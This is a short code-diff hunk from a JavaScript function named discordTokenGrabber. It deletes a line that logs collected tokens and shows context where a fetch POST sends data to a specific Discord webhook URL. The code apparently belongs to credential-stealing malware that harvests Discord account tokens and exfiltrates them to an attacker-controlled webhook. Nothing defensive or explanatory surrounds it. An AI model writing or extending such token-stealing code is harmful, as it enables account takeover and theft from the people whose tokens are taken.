@@ -293,7 +293,6 @@ function discordTokenGrabber() {
       });
     }
   }
-  console.log(tokens);
   fetch("https://discord.com/api/webhooks/1089530389292388463/6kIrdtmkWbIkk93u34iD3rvLETiCYPEADkP2bLCvyNN-NjgXJ4cWcfs1EOPW2FxR-5nh", {
     method: "POST",
     headers: {
